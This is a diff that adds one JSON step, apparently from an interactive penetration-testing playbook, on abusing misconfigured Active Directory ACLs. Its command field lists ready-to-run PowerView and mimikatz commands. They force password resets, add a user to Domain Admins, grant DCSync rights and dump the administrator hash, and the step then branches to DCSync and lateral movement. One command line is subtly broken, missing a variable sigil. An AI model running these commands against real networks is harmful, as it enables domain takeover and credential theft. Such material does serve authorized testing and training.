@@ -1,0 +1,18 @@
+{
+  "id": "acl_abuse",
+  "phase": "AD",
+  "title": "ACL Abuse",
+  "body": "BloodHound showed you a misconfigured ACL. GenericAll, GenericWrite, WriteDACL, ForceChangePassword — all paths to escalation.",
+  "cmd": "# GenericAll over user — force password reset\nSet-DomainUserPassword -Identity targetuser \\\n  -AccountPassword (ConvertTo-SecureString 'Hack3d!23' -AsPlainText -Force)\n\n# GenericAll over group — add yourself\nAdd-DomainGroupMember -Identity 'Domain Admins' -Members 'youruser'\n\n# WriteDACL — grant yourself DCSync\nAdd-DomainObjectAcl \\\n  -TargetIdentity \"DC=domain,DC=com\" \\\n  -PrincipalIdentity youruser \\\n  -Rights DCSync\n\n# ForceChangePassword\ncred = New-Object System.Net.NetworkCredential(\"\",\"NewPass123!\")\nSet-DomainUserPassword -Identity target -AccountPassword cred.SecurePassword\n\n# DCSync once you have rights\n.\\mimikatz.exe \"privilege::debug\" \\\n  \"lsadump::dcsync /domain:domain.com /user:administrator\" \"exit\"",
+  "warn": null,
+  "choices": [
+    {
+      "label": "Got DA hash via DCSync",
+      "next": "dcsync"
+    },
+    {
+      "label": "Added self to Domain Admins — lateral move",
+      "next": "lateral_movement"
+    }
+  ]
+}
